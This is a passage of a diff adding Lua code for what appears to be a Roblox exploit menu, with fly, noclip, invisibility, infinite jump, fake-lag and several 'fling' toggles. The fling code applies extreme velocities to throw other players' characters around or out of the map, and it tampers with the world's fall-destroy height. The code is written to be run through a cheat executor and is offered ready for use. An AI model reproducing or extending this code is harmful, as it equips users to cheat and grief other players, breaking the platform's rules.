+        if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
+          Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
+        end
+        if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
+          SPEED = 50
+        elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
+          SPEED = 0
+        end
+        if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
+          BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+          lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
+        elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
+          BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
+        else
+          BV.velocity = Vector3.new(0, 0, 0)
+        end
+        BG.cframe = workspace.CurrentCamera.CoordinateFrame
+      until not FLYING
+      CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+      lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
+      SPEED = 0
+      BG:Destroy()
+      BV:Destroy()
+      if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
+        Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
+      end
+    end)
+  end
+  flyKeyDown = IYMouse.KeyDown:Connect(function(KEY)
+    if KEY:lower() == 'w' then
+      CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
+    elseif KEY:lower() == 's' then
+      CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
+    elseif KEY:lower() == 'a' then
+      CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
+    elseif KEY:lower() == 'd' then 
+      CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
+    elseif QEfly and KEY:lower() == 'e' then
+      CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
+    elseif QEfly and KEY:lower() == 'q' then
+      CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
+    end
+    pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
+  end)
+  flyKeyUp = IYMouse.KeyUp:Connect(function(KEY)
+    if KEY:lower() == 'w' then
+      CONTROL.F = 0
+    elseif KEY:lower() == 's' then
+      CONTROL.B = 0
+    elseif KEY:lower() == 'a' then
+      CONTROL.L = 0
+    elseif KEY:lower() == 'd' then
+      CONTROL.R = 0
+    elseif KEY:lower() == 'e' then
+      CONTROL.Q = 0
+    elseif KEY:lower() == 'q' then
+      CONTROL.E = 0
+    end
+  end)
+  FLY()
+end
+
+function NOFLY()
+  FLYING = false
+  if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
+  if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
+    Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
+  end
+  pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
+end
+Tab:AddToggle({
+  Name = "Fly",
+  Default = false,
+  Callback = function(Fly)
+    if Fly == true then
+               NOFLY()
+  wait()
+  sFLY()
+          else
+               Fly = false
+               NOFLY()
+  end
+  end    
+})
+
+Tab:AddTextbox({
+  Name = "Fly Speed",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(Flyspeed)
+    iyflyspeed = Flyspeed  
+    end	
+})
+
+Tab:AddToggle({
+  Name = "Mobile Fly",
+  Default = false,
+  Callback = function(cFly)
+    if cFly == true then
+               plr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
+  local Head = plr.Character:WaitForChild("Head")
+  Head.Anchored = true
+  CFloop = game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
+    local moveDirection = plr.Character:FindFirstChildOfClass('Humanoid').MoveDirection * (CFspeed * deltaTime)
+    local headCFrame = Head.CFrame
+    local cameraCFrame = game.Workspace.CurrentCamera.CFrame
+    local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
+    cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
+    local cameraPosition = cameraCFrame.Position
+    local headPosition = headCFrame.Position
+
+    local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
+    Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
+  end)
+          else
+               cFly = false
+               if CFloop then
+    CFloop:Disconnect()
+    plr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
+    local Head = plr.Character:WaitForChild("Head")
+    Head.Anchored = false
+  end
+  end
+  end    
+})
+
+Tab:AddTextbox({
+  Name = "Mobile Fly Speed",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(cFlyspeed)
+    CFspeed = cFlyspeed
+  end	
+})
+
+Tab:AddToggle({
+  Name = "Fly Fling",
+  Default = false,
+  Callback = function(Fly)
+    if Fly == true then
+               NOFLY()
+  wait()
+    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+    if v:IsA("Part") then
+
+v.CustomPhysicalProperties = PhysicalProperties.new(9e99, 9e99, 9e99, 9e99, 9e99)
+end
+end
+    Noclip()
+  sFLY(true)
+    local BodyAV = Instance.new("BodyAngularVelocity", game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
+BodyAV.AngularVelocity = Vector3.new(0, 2000, 0)
+BodyAV.MaxTorque = Vector3.new(0, math.huge, 0)
+BodyAV.Name = "FlyFling"
+BodyAV.P = 1250
+          else
+               Fly = false
+               NOFLY()
+               for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+    if child.ClassName == "Part" then
+      child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5, 0, 0)
+    end
+  end
+               for i,v in pairs(plr.Character:GetDescendants()) do
+                   if v:IsA("BodyAngularVelocity") and v.Name == "FlyFling" then
+                      v:Destroy()
+                   end
+               end
+               vNoclip = false
+      if Noclipping then
+    Noclipping:Disconnect()
+  end
+  Clip = true
+  end
+  end    
+})
+
+Tab:AddTextbox({
+  Name = "Fly Fling Speed",
+  Default = "",
+  TextDisappear = true,
+  Callback = function(vFlyspeedsz)
+    vehicleflyspeed = vFlyspeedsz
+    end	
+})
+
+Tab:AddButton({
+	Name = "no fog",
+	Callback = function()
+     local Lighting = game.Lighting
+			 Lighting.FogEnd = 100000
+			 for i,v in pairs(Lighting:GetDescendants()) do
+				 if v:IsA("Atmosphere") then
+					 v:Destroy()
+				 end
+			 end 	
+  	end   
+})
+
+Tab:AddButton({
+	Name = "firstp",
+	Callback = function()
+      	game.Players.LocalPlayer.CameraMode = "LockFirstPerson"
+  	end   
+})
+
+Tab:AddButton({
+	Name = "thirdp",
+	Callback = function()
+      game.Players.LocalPlayer.CameraMaxZoomDistance = 10
+	game.Players.LocalPlayer.CameraMode = "Classic"	
+  	end   
+})
+
+Tab:AddToggle({
+  Name = "Fake Character Lag",
+  Default = false,
+  Callback = function(fakelaglol)
+    if fakelaglol == true then
+               Lagging = true
+  repeat wait()
+    plr.Character.HumanoidRootPart.Anchored = false
+    wait(1.5)
+    plr.Character.HumanoidRootPart.Anchored = true
+    wait(3)
+  until Lagging == false
+          else
+               fakelaglol = false
+               Lagging = false
+         wait(.3)
+  plr.Character.HumanoidRootPart.Anchored = false
+  end
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Super Fake Character Lag",
+  Default = false,
+  Callback = function(fakelaglol)
+    if fakelaglol == true then
+               Lagging = true
+  repeat wait()
+    plr.Character.HumanoidRootPart.Anchored = false
+    wait(.1)
+    plr.Character.HumanoidRootPart.Anchored = true
+    wait(.1)
+  until Lagging == false
+          else
+               fakelaglol = false
+               Lagging = false
+         wait(.3)
+  plr.Character.HumanoidRootPart.Anchored = false
+  end
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show FPS",
+  Default = false,
+  Callback = function(ShowFPS)
+    if ShowFPS == true then
+               local ToolNameGrabber = Instance.new("ScreenGui", getParent)
+  local ToolNameTxt = Instance.new("TextLabel", getParent)
+  local player = cmdlp
+  ToolNameGrabber.Name = "ToolNameGrabber"
+  ToolNameGrabber.Parent = game.CoreGui
+  ToolNameGrabber.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+  ToolNameGrabber.Enabled = true
+  ToolNameTxt.Name = "ToolNameTxt"
+  ToolNameTxt.Parent = ToolNameGrabber
+  ToolNameTxt.BackgroundColor3 = Color3.new(1, 1, 1)
+  ToolNameTxt.BackgroundTransparency = 1
+  ToolNameTxt.BorderColor3 = Color3.new(0, 0, 0)
+  ToolNameTxt.Position = UDim2.new(0.894944727, 0, 0.952606618, 0)
+  ToolNameTxt.Size = UDim2.new(0, 133, 0, 30)
+  ToolNameTxt.Font = Enum.Font.GothamSemibold
+  ToolNameTxt.Text = "TextLabel"
+  ToolNameTxt.TextColor3 = Color3.new(0, 1, 0)
+  ToolNameTxt.TextScaled = true
+  ToolNameTxt.TextSize = 14
+  ToolNameTxt.TextWrapped = true
+  ToolNameTxt.Visible = true
+  local FpsLabel = ToolNameTxt
+  local Heartbeat = game:GetService("RunService").Heartbeat
+  local LastIteration, Start
+  local FrameUpdateTable = { }
+  local function HeartbeatUpdate()
+    LastIteration = tick()
+    for Index = #FrameUpdateTable, 1, -1 do
+      FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
+    end
+    FrameUpdateTable[1] = LastIteration
+    local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
+    CurrentFPS = CurrentFPS - CurrentFPS % 1
+    FpsLabel.Text = "" .. CurrentFPS .. " FPS"
+  end
+  Start = tick()
+  Heartbeat:Connect(HeartbeatUpdate)
+          else
+         ShowFPS = false
+               for i,fps in pairs(game.CoreGui:GetDescendants()) do
+           if fps.Name == "ToolNameGrabber" then
+             fps:Destroy()
+           end	   
+         end
+  end
+  end    
+})
+
+Tab:AddToggle({
+  Name = "Show Ping",
+  Default = false,
+  Callback = function(ShowPing)
+    if ShowPing == true then
+               local PingGrabber = Instance.new("ScreenGui", getParent)
+  local ToolNameTxt = Instance.new("TextLabel", getParent)
+  local player = cmdlp
+  PingGrabber.Name = "PingGrabber"
+  PingGrabber.Parent = game.CoreGui
+  PingGrabber.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+  PingGrabber.Enabled = true
+  ToolNameTxt.Name = "ToolNameTxt"
+  ToolNameTxt.Parent = PingGrabber
+  ToolNameTxt.BackgroundColor3 = Color3.new(1, 1, 1)
+  ToolNameTxt.BackgroundTransparency = 1
+  ToolNameTxt.BorderColor3 = Color3.new(0, 0, 0)
+  ToolNameTxt.Position = UDim2.new(0.8, 0, 0.952606618, 0)
+  ToolNameTxt.Size = UDim2.new(0, 133, 0, 30)
+  ToolNameTxt.Font = Enum.Font.GothamSemibold
+  ToolNameTxt.Text = "TextLabel"
+  ToolNameTxt.TextColor3 = Color3.new(0, 1, 0)
+  ToolNameTxt.TextScaled = true
+  ToolNameTxt.TextSize = 14
+  ToolNameTxt.TextWrapped = true
+  ToolNameTxt.Visible = true
+  local PingLabel = ToolNameTxt
+  local Heartbeat = game:GetService("RunService").Heartbeat
+  local LastIteration, Start
+  local FrameUpdateTable = { }
+  local function HeartbeatUpdate()
+    LastIteration = tick()
+    for Index = #FrameUpdateTable, 1, -1 do
+      FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
+    end
+    FrameUpdateTable[1] = LastIteration
+    local Current_Ping = string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1]
+    Current_Ping = Current_Ping - Current_Ping % 1
+    PingLabel.Text = "Ping: " .. Current_Ping .. " ms"
+  end
+  Start = tick()
+  Heartbeat:Connect(HeartbeatUpdate)
+          else
+         ShowPing = false
+               for i,ping in pairs(game.CoreGui:GetDescendants()) do
+           if ping.Name == "PingGrabber" then
+             ping:Destroy()
+           end	   
+         end
+  end
+  end    
+})
+Tab:AddToggle({
+  Name = "Infinite Jump ",
+  Default = false,
+  Callback = function(jumpsFly)
+    if jumpsFly == true then
+               if flyjump then 
+            flyjump:Disconnect() 
+         end
+  flyjump = UserInputService.JumpRequest:Connect(function(Jump)
+    game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+  end)
+          else
+               jumpsFly = false
+               if flyjump then 
+          flyjump:Disconnect() 
+         end
+  end
+  end    
+})
+Tab:AddToggle({
+  Name = "Invisible",
+  Default = false,
+  Callback = function(invisibleofc)
+    if invisibleofc == true then
+              if invisRunning then return end
+  invisRunning = true
+  -- Full credit to AmokahFox @V3rmillion
+  local Player = plr
+  repeat wait(.1) until Player.Character
+  local Character = Player.Character
+  Character.Archivable = true
+  InvisibleCharacter = Character:Clone()
+  InvisibleCharacter.Parent = game:GetService'Lighting'
+  local Void = game.Workspace.FallenPartsDestroyHeight
+  InvisibleCharacter.Name = ""
+       invisFix = game:GetService("RunService").Stepped:Connect(function()
+    pcall(function()
+      local IsInteger
+      if tostring(Void):find'-' then
+        IsInteger = true
+      else
+        IsInteger = false
+      end
+      local Pos = Player.Character.HumanoidRootPart.Position
+      local Pos_String = tostring(Pos)
+      local Pos_Seperate = Pos_String:split(', ')
+      local X = tonumber(Pos_Seperate[1])
+      local Y = tonumber(Pos_Seperate[2])
+      local Z = tonumber(Pos_Seperate[3])
+      if IsInteger == true then
+        if Y <= Void then
+          invisRespawn()
+        end
+      elseif IsInteger == false then
+        if Y >= Void then
+          invisRespawn()
+        end
+      end
+    end)
+  end)
+        for i,v in pairs(InvisibleCharacter:GetDescendants())do
+    if v:IsA("BasePart") then
+      if v.Name == "HumanoidRootPart" then
+        v.Transparency = 1
+      else
+        v.Transparency = .5
+      end
+    end
+  end
+  invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
+    invisRespawn()
+    invisDied:Disconnect()
+  end)
+  if IsInvis == true then return end
+  IsInvis = true
+  CF = game.Workspace.CurrentCamera.CFrame
+  local CF_1 = Player.Character.HumanoidRootPart.CFrame
+  Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
+  game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+  wait(.2)
+  game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
+  InvisibleCharacter = InvisibleCharacter
+  Character.Parent = game:GetService'Lighting'
+  InvisibleCharacter.Parent = game.Workspace
+  InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
+  Player.Character = InvisibleCharacter
+  fixcam()
+  Player.Character.Animate.Disabled = true
+  Player.Character.Animate.Disabled = false
+          else
+               invisibleofc = false
+         TurnVisible()
+  end
+  end    
+})
+Tab:AddToggle({
+  Name = "Noclip",
+  Default = false,
+  Callback = function(Noclip)
+        if Noclip == true then
+            Clip = false
+  wait(0.1)
+  local function NoclipLoop()
+    if Clip == false and plr.Character ~= nil then
+      for _, child in pairs(plr.Character:GetDescendants()) do
+        if child:IsA("BasePart") and child.CanCollide == true then
+          child.CanCollide = false
+        end
+      end
+    end
+  end
+  Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
+    else
+        Noclip = false
+      if Noclipping then
+    Noclipping:Disconnect()
+  end
+  Clip = true
+    end		
+  end    
+})
+Tab:AddButton({
+  Name = "Fling Click",
+  Callback = function()
+   local Players = game:GetService("Players")
+     local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
+
+     Mouse.Button1Down:Connect(function()
+         local Target = Mouse.Target
+         if Target and Target.Parent and Target.Parent:IsA("Model") and Players:GetPlayerFromCharacter(Target.Parent) then
+             local PlayerName = Players:GetPlayerFromCharacter(Target.Parent).Name
+     local player = game.Players.LocalPlayer
+     local Targets = {PlayerName}
+
+     local Players = game:GetService("Players")
+     local Player = Players.LocalPlayer
+
+     local AllBool = false
+
+     local GetPlayer = function(Name)
+        Name = Name:lower()
+        if Name == "all" or Name == "others" then
+            AllBool = true
+            return
+        elseif Name == "random" then
+            local GetPlayers = Players:GetPlayers()
+            if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
+            return GetPlayers[math.random(#GetPlayers)]
+        elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
+            for _,x in next, Players:GetPlayers() do
+                if x ~= Player then
+                    if x.Name:lower():match("^"..Name) then
+                        return x;
+                    elseif x.DisplayName:lower():match("^"..Name) then
+                        return x;
+                    end
+                end
+            end
+        else
+            return
+        end
+     end
+
+     local Message = function(_Title, _Text, Time)
+print(_Title)
+print(_Text)
+print(Time)
+     end
+
+     local SkidFling = function(TargetPlayer)
+        local Character = Player.Character
+        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+        local RootPart = Humanoid and Humanoid.RootPart
+
+        local TCharacter = TargetPlayer.Character
+        local THumanoid
+        local TRootPart
+        local THead
+        local Accessory
+        local Handle
+if TCharacter:FindFirstChildOfClass("Humanoid") then
+            THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+        end
+        if THumanoid and THumanoid.RootPart then
+            TRootPart = THumanoid.RootPart
+        end
+        if TCharacter:FindFirstChild("Head") then
+            THead = TCharacter.Head
+        end
+        if TCharacter:FindFirstChildOfClass("Accessory") then
+            Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+        end
+        if Accessoy and Accessory:FindFirstChild("Handle") then
+            Handle = Accessory.Handle
+        end
+
+        if Character and Humanoid and RootPart then
+            if RootPart.Velocity.Magnitude < 50 then
+                getgenv().OldPos = RootPart.CFrame
+            end
+            if THumanoid and THumanoid.Sit and not AllBool then
+            end
+            if THead then
+                workspace.CurrentCamera.CameraSubject = THead
+            elseif not THead and Handle then
+                workspace.CurrentCamera.CameraSubject = Handle
+            elseif THumanoid and TRootPart then
+                workspace.CurrentCamera.CameraSubject = THumanoid
+            end
+            if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+                return
+            end
+
+            local FPos = function(BasePart, Pos, Ang)
+                RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+                Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+                RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+                RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+            end
+
+            local SFBasePart = function(BasePart)
+                local TimeToWait = 2
+                local Time = tick()
+                local Angle = 0
+
+                repeat
+                    if RootPart and THumanoid then
+                        if BasePart.Velocity.Magnitude < 50 then
+                            Angle = Angle + 100
+
+                            FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                            task.wait()
+                        else
+                            FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+                            task.wait()
+
+                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                            task.wait()
+                        end
+                    else
+                        break
+                    end
+until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+            end
+
+            workspace.FallenPartsDestroyHeight = 0/0
+
+            local BV = Instance.new("BodyVelocity")
+            BV.Name = "EpixVel"
+            BV.Parent = RootPart
+            BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+            BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+
+            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+
+            if TRootPart and THead then
+                if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+                    SFBasePart(THead)
+                else
+                    SFBasePart(TRootPart)
+                end
+            elseif TRootPart and not THead then
+                SFBasePart(TRootPart)
+            elseif not TRootPart and THead then
+                SFBasePart(THead)
+            elseif not TRootPart and not THead and Accessory and Handle then
+                SFBasePart(Handle)
+            else
+            end
+
+            BV:Destroy()
+            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+            workspace.CurrentCamera.CameraSubject = Humanoid
+
+            repeat
+                RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+                Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+                Humanoid:ChangeState("GettingUp")
+                table.foreach(Character:GetChildren(), function(_, x)
+                    if x:IsA("BasePart") then
+                        x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+                    end
+                end)
+                task.wait()
+            until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+            workspace.FallenPartsDestroyHeight = getgenv().FPDH
+        else
+        end
+     end
+
+     getgenv().Welcome = true
+     if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
+
+     if AllBool then
+        for _,x in next, Players:GetPlayers() do
+            SkidFling(x)
+        end
+     end
+
+     for _,x in next, Targets do
+        if GetPlayer(x) and GetPlayer(x) ~= Player then
+            if GetPlayer(x).UserId ~= 1414978355 then
+                local TPlayer = GetPlayer(x)
+                if TPlayer then
+                    SkidFling(TPlayer)
+                end
+            else
+            end
+        elseif not GetPlayer(x) and not AllBool then
+        end
+     end
+         end
+     end)   	
+    end   
+})
+
+Tab:AddToggle({
+	Name = "Walkfling OP",
+	Default = false,
+	Callback = function(V)
+		if V == true then
+		   if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
+     hiddenfling = true
+   else
+     hiddenfling = true
+     detection = Instance.new("Decal")
+     detection.Name = "juisdfj0i32i0eidsuf0iok"
+     detection.Parent = game:GetService("ReplicatedStorage")
+     local function fling()
+       local hrp, c, vel, movel = nil, nil, nil, 0.1
+       while true do
+         game:GetService("RunService").Heartbeat:Wait()
+         if hiddenfling then
+           local lp = game.Players.LocalPlayer
+           while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
+             game:GetService("RunService").Heartbeat:Wait()
+             c = lp.Character
+             hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
+           end
+           if hiddenfling then
+             vel = hrp.Velocity
+             hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
+             game:GetService("RunService").RenderStepped:Wait()
+             if c and c.Parent and hrp and hrp.Parent then
+               hrp.Velocity = vel
+             end
+             game:GetService("RunService").Stepped:Wait()
+             if c and c.Parent and hrp and hrp.Parent then
+               hrp.Velocity = vel + Vector3.new(0, movel, 0)
+               movel = movel * -1
+             end
+           end
+         end
+       end
+     end
+
+     fling()
+      end   	
+      else
+      if V == false then
+      hiddenfling = false
+      end
+      end
+	end    
+})
+
+
+Tab:AddToggle({
+    Name = "Spin fling",
+    Default = false,
+    Callback = function(Value)
+        if Value == true then
+            function getRoot(char)
+                local rootPart = game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') or 
+                                 game.Players.LocalPlayer.Character:FindFirstChild('Torso') or 
+                                 game.Players.LocalPlayer.Character:FindFirstChild('UpperTorso')
+                return rootPart
+            end
+
+            local Noclipping = nil
+            Clip = false
+            wait(0.1)
+
+            local function NoclipLoop()
+                if Clip == false and game.Players.LocalPlayer.Character ~= nil then
+                    for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+                        if child:IsA("BasePart") and child.CanCollide == true then
+                            child.CanCollide = false
+                        end
+                    end
+                end
+            end
+            Noclipping = game:GetService("RunService").Stepped:Connect(NoclipLoop)
+
+            local flinging = false
+            for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+                if child:IsA("BasePart") then
+                    child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, 0.3, 0.5)
+                end
+            end
+
+            wait(0.2)
+
+            local bambam = Instance.new("BodyAngularVelocity")
+            bambam.Name = "0"
+            bambam.Parent = getRoot(game.Players.LocalPlayer.Character)
+            bambam.AngularVelocity = Vector3.new(0, 99999, 0)
+            bambam.MaxTorque = Vector3.new(0, math.huge, 0)
+            bambam.P = math.huge
+
+            local Char = game.Players.LocalPlayer.Character:GetChildren()
+            for _, v in pairs(Char) do
+                if v:IsA("BasePart") then
+                    v.CanCollide = false
+                    v.Massless = true
+                    v.Velocity = Vector3.new(0, 0, 0)
+                end
+            end
+            flinging = true
+
+            local function flingDiedF()
+                if flingDied then
+                    flingDied:Disconnect()
+                end
+                flinging = false
+                wait(0.1)
+
+                local speakerChar = game.Players.LocalPlayer.Character
+                if not speakerChar or not getRoot(speakerChar) then return end
+
+                for _, v in pairs(getRoot(speakerChar):GetChildren()) do
+                    if v.ClassName == 'BodyAngularVelocity' then
+                        v:Destroy()
+                    end
+                end
+                for _, child in pairs(speakerChar:GetDescendants()) do
+                    if child.ClassName == "Part" or child.ClassName == "MeshPart" then
+                        child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
+                    end
+                end
+            end
+
+            flingDied = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(flingDiedF)
+            repeat
+                bambam.AngularVelocity = Vector3.new(0, 99999, 0)
+                wait(0.2)
+                bambam.AngularVelocity = Vector3.new(0, 0, 0)
+                wait(0.1)
+            until flinging == false
+        else
+            if flingDied then
+                flingDied:Disconnect()
+            end
+            flinging = false
+            wait(0.1)
+
+            local speakerChar = game.Players.LocalPlayer.Character
+            if not speakerChar or not getRoot(speakerChar) then return end
+
+            for _, v in pairs(getRoot(speakerChar):GetChildren()) do
+                if v.ClassName == 'BodyAngularVelocity' then
+                    v:Destroy()
+                end
+            end
+            for _, child in pairs(speakerChar:GetDescendants()) do
+                if child.ClassName == "Part" or child.ClassName == "MeshPart" then
+                    child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
+                end
+            end
+        end
+    end
+})
+
+
+Tab:AddButton({
+  Name = "Fling Touch",
+  Callback = function()
+        local player = game.Players.LocalPlayer
+local character1 = player.Character
+local mouse = player:GetMouse()
+
+local fakebody = Instance.new("Part", character1)
+fakebody.Transparency = 1
+fakebody.Anchored = true
+fakebody.CanCollide = false
+fakebody.Position = character1.Head.Position
+fakebody.Name = "FPart"
+wait()
+
+_G.ReanimationType = "Fling" --PDeath, Fling, Simple
+_G.Velocity = Vector3.new(36,0,0)
+_G.FlingBlock = true
+_G.FlingBlockTransparency = 1
+_G.HighlightFlingBlock = true
+_G.FlingBlockPosition = "FPart"
+_G.HighlightFlingBlockColor = Color3.fromRGB(255,0,0)
+
